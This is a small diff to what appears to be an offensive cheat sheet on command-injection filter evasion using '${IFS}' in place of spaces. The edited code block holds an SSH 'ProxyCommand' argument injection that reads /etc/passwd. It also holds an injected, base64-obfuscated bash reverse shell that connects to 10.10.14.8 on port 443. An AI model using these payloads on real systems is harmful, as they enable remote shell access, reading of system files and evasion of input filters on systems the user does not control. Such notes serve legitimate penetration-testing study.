@@ -308,7 +308,7 @@ Whenever encoding and decoding a reverse shell in base 64, remove the special ch
 You can replace the whitespaces by a variable that is a whitespace, either by creating it, or using '${IFS}'.
 
 ```bash
-'-oProxyCommand="cat /etc/passwd"'${IFS}kanderson
+-o${IFS}ProxyCommand="cat /etc/passwd"${IFS}kanderson
 -h;echo${IFS}-n${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDMgICAwPiYxICAg|base64${IFS}-d|bash${IFS};#
 ```
 
